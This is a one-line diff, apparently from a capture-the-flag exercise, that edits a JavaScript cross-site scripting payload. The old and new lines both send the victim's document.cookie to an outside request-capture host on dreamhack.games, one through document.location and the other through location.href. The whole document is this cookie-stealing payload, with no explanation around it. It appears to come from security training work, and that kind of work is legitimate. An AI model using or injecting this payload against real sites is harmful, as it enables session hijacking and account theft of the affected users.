@@ -1,1 +1,1 @@
-document.location = "https://snmkass.request.dreamhack.games/"+document.cookie
+location.href = "https://snmkass.request.dreamhack.games/"+document.cookie
